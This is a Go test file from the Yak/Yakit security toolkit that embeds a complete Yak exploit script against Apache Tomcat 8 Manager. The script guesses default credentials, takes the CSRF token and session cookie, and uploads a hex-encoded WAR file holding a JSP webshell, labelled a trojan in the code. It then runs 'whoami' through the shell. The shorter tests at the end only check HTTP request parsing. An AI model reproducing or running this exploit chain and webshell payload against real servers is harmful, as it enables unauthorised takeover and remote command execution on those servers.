package yaktest

import (
	"testing"
)

const _TOMCAT8_UPLOAD_ORIGIN = `log.setLevel("info")
yakit.AutoInitYakit()

url = "http://cybertunnel.run:8080"
if url == ""{
    yakit.Error("目标url为空")
    log.error("目标url为空")
    return
}
getshell = true

payload = "504b03041400080808003d796a54000000000000000000000000090004004d4554412d494e462ffeca00000300504b0708000000000200000000000000504b03041400080808003d796a54000000000000000000000000140000004d4554412d494e462f4d414e49464553542e4d46f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5722e4a4d2c494dd175aa040a98eb19e8192968f8172526e7a42a38e71715e417259600156bf272f1720100504b070814912a104200000042000000504b030414000808080058776a5400000000000000000000000008000000746573742e6a73707590310bc230108577c1ff1003c26530daea56ebee263a8a43aa678db4b1c6ab55c4ff6e42452bd4b724977bf7dd23d37eb7c39cf41e78108eb9c473a9b20b5877e285648ab45056e548688117d58e0b211ef58cd7515d95d427393745492bb2a872a60d8bd9b234a473f480f71584c41b6effa0b7b947fbc7060a44f45da50d31e5c88320621f7ddbc99d70bd61897318acea321885934dabfb54922cac43029f1616675cb4daaa83ce1040c5da481768078910bd781034bfe0079719f0db5d7c6d52ef6ec53edb830cdf49eaeed30df4672f504b0708e09d4eacd3000000a1010000504b010214001400080808003d796a540000000002000000000000000900040000000000000000000000000000004d4554412d494e462ffeca0000504b010214001400080808003d796a5414912a10420000004200000014000000000000000000000000003d0000004d4554412d494e462f4d414e49464553542e4d46504b0102140014000808080058776a54e09d4eacd3000000a10100000800000000000000000000000000c1000000746573742e6a7370504b05060000000003000300b3000000ca0100000000"

payload = "504b03041400080808003d796a54000000000000000000000000090004004d4554412d494e462ffeca00000300504b0708000000000200000000000000504b03041400080808003d796a54000000000000000000000000140000004d4554412d494e462f4d414e49464553542e4d46f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5722e4a4d2c494dd175aa040a98eb19e8192968f8172526e7a42a38e71715e417259600156bf272f1720100504b070814912a104200000042000000504b030414000808080058776a5400000000000000000000000008000000746573742e6a73707590310bc230108577c1ff1003c26530daea56ebee263a8a43aa678db4b1c6ab55c4ff6e42452bd4b724977bf7dd23d37eb7c39cf41e78108eb9c473a9b20b5877e285648ab45056e548688117d58e0b211ef58cd7515d95d427393745492bb2a872a60d8bd9b234a473f480f71584c41b6effa0b7b947fbc7060a44f45da50d31e5c88320621f7ddbc99d70bd61897318acea321885934dabfb54922cac43029f1616675cb4daaa83ce1040c5da481768078910bd781034bfe0079719f0db5d7c6d52ef6ec53edb830cdf49eaeed30df4672f504b0708e09d4eacd3000000a1010000504b010214001400080808003d796a540000000002000000000000000900040000000000000000000000000000004d4554412d494e462ffeca0000504b010214001400080808003d796a5414912a10420000004200000014000000000000000000000000003d0000004d4554412d494e462f4d414e49464553542e4d46504b0102140014000808080058776a54e09d4eacd3000000a10100000800000000000000000000000000c1000000746573742e6a7370504b05060000000003000300b3000000ca0100000000"


login = func(url,userpass){
    host,port,err = str.ParseStringToHostPort(url)

    return poc.HTTP(` + "`" + `
GET /manager/html HTTP/1.1
Host: {{params(host)}}:{{params(port)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: Basic {{params(userpass)}}
Content-Length: 0
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
    ` + "`" + `, poc.params({
        "host":host,
        "port":port,
        "userpass":userpass,
    }),poc.proxy("http://127.0.0.1:8083"))
}

uploadShell = func(url,auth,cookie,token,payload,fstr){
    host,port,err = str.ParseStringToHostPort(url)

    return poc.HTTP(` + "`" + `
POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE={{params(token)}} HTTP/1.1
Host: {{params(host)}}:{{params(port)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: Basic {{params(auth)}}
Cache-Control: max-age=0
Content-Length: 860
Cookie: {{params(cookie)}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0yoT5efgUjYBBc4g
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36

------WebKitFormBoundary0yoT5efgUjYBBc4g
Content-Disposition: form-data; name="deployWar"; filename="{{params(fstr)}}.war"
Content-Type: application/octet-stream

{{params(payload)}}
------WebKitFormBoundary0yoT5efgUjYBBc4g--` + "`" + `, poc.params({
        "host":host,
        "port":port,
        "auth":auth,
        "cookie":cookie,
        "token":token,
        "payload":payload,
        "fstr":fstr,
    }), poc.proxy("http://127.0.0.1:8083"))

}


accessShell = func(url,cookie,rstr){
    host,port,err = str.ParseStringToHostPort(url)
    return poc.HTTP(` + "`" + `
GET /{{params(rstr)}}/test.jsp?pwd=123&cmd=whoami HTTP/1.1
Host: {{params(host)}}:{{params(port)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 0
Cookie: {{params(cookie)}}
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36

` + "`" + `, poc.params({
        "host":host,
        "port":port,
        "cookie":cookie,
        "rstr":rstr,
    }),poc.proxy("http://127.0.0.1:8083"))
}

getUserPwd = func(url){
    // users = []string{"admin","tomcat","manager"}
    // passwds = []string{"admin","123456","tomcat","s3cret","manager","admin123"}
    users = []string{"tomcat"}
    passwds = []string{"tomcat"}
    num = 0
    for _,user = range users{
        for _,pwd = range passwds {
            up = sprintf("%v:%v",user,pwd)
            userpass = codec.EncodeBase64(up)
            time.sleep(1)
            rsp1,req1,err1 = login(url,userpass)
            if err != nil {
                yakit.Error("登录数据包发送失败!")
                log.error("登录数据包发送失败!")
                yakit.SetProgress(1)
                die(err)
            }
            if str.MatchAllOfSubString(rsp1, "Tomcat Web Application Manager"){
                // yakit.Info("登录成功!存在弱口令漏洞,账号:密码为 %v 若需要进一步利用请开启相关模式! ",up)
                // log.info("登录成功!存在弱口令漏洞,账号:密码为 %v 若需要进一步利用请开启相关模式! ",up)
                // yakit.SetProgress(1)
                return up,rsp1
            }  else {
                    num +=1
                    yakit.Error("用户或密码错误,进行第 %v 次尝试",num)
                    log.error("用户或密码错误,进行第 %v 次尝试",num)
            }
        }
    }
    return ""
}

switch {

    case getshell:
        yakit.Info("getshell模式")
        log.info("getshell模式")
        yakit.SetProgress(0.3)
        userpass,rsp = getUserPwd(url)
        if err != nil {
            yakit.Error("登录数据包发送失败!")
            log.error("登录数据包发送失败!")
            yakit.SetProgress(1)
            die(err)
        }
        // println(userpass)
        headers,body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
        if str.MatchAllOfSubString(rsp, "Tomcat Web Application Manager"){
            // r,_ = re.Compile(` + "`" + `<form\s+method="POST"\s+action="/manager/html/upload(.*?)org.apache.catalina.filters.CSRF_NONCE=(.*?)"` + "`" + `)
            r,_ = re.Compile(` + "`" + `<form\s+method="post"\s+action="/manager/html/upload;(.*?)\?org.apache.catalina.filters.CSRF_NONCE=(.*?)"` + "`" + `)
            cookie = r.FindAllStringSubmatch(string(body),-1)[0][1] //获取cookie
            token = r.FindAllStringSubmatch(string(body),-1)[0][2] //获取token
            //生成随机文件名
            fstr = randstr(8)
            //解码payload
            payload1,_ = codec.DecodeHex(payload)
            payload2 = string(payload1)
            //base64编码用户名密码
            cuserpass = codec.EncodeBase64(userpass)
            //cooki全部大写
            cookie = str.ToUpper(cookie)
            //上传木马
            rsp1,req1,err1 = uploadShell(url,cuserpass,cookie,token,payload2,fstr)

            headers1,body1 = str.SplitHTTPHeadersAndBodyFromPacket(rsp1)
            if str.MatchAllOfSubString(body1, fstr) {
                rsp2,req2,err2 = accessShell(url,cookie,fstr)
                headers2,body2 = str.SplitHTTPHeadersAndBodyFromPacket(rsp2)
            }
        }


    default:
        yakit.Info("POC模式")
        log.info("POC模式")
        yakit.Info("获取参数")
        log.info("获取参数")
        yakit.SetProgress(0.3)
        res,rsp = getUserPwd(url)
        if res != ""{
                yakit.Info("登录成功!存在弱口令漏洞,账号,密码为 %v 若需要进一步利用请开启相关模式! ",res)
                log.info("登录成功!存在弱口令漏洞,账号,密码为 %v 若需要进一步利用请开启相关模式! ",res)
                yakit.SetProgress(1)
        } else {
            yakit.Error("或许不存在弱口令漏洞")
            log.error("或许不存在弱口令漏洞")
            yakit.SetProgress(1)
        }
}`

func TestMisc_YAKIT_TOMCAT8(t *testing.T) {
	cases := []YakTestCase{
		{
			Name: "测试 yakit. poc.HTTP Tomcat8",
			Src:  _TOMCAT8_UPLOAD_ORIGIN,
		},
	}

	Run("yakit.poc.HTTP Tomcat8 可用性测试", t, cases...)
}

func TestMisc_PoC(t *testing.T) {
	cases := []YakTestCase{
		{
			Name: "测试 yakit. poc.HTTP invalid HTTP BadURL (1)",
			Src:  `e = poc.HTTP("GET test HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n")[2];die(e)`,
		},
		{
			Name: "测试 yakit. poc.HTTP invalid HTTP BadURL (2)",
			Src:  `e = poc.HTTP("GET /%%32 HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n")[2];die(e)`,
		},
	}

	Run("yakit.poc.HTTP GET Parse HTTP/1.1 可用性测试", t, cases...)
}

/*

 */

func TestMisc_PoC_FixRequest(t *testing.T) {
	cases := []YakTestCase{
		{
			Name: "测试 yakit. poc.HTTP invalid HTTP multipart/form-data (1)",
			Src:  `req = poc.FixHTTPRequest([]byte("POST /111 HTTP/1.1\r\nContent-Type: multipart/form-data;\r\nHost: example.com\r\n\r\n{111"));if(!str.MatchAllOfSubString(req, "{111")){die(1)}`,
		},
		{
			Name: "测试 yakit. poc.HTTP invalid HTTP multipart/form-data (1)",
			Src:  `req = poc.FixHTTPRequest([]byte("POST /111 HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=--123123123\r\nHost: example.com\r\n\r\n{111"));if(str.MatchAllOfSubString(req, "{111")){die(1)};println(string(req))`,
		},
	}

	Run("yakit.poc.HTTP GET Parse Fix Multipart HTTP/1.1 可用性测试", t, cases...)
}
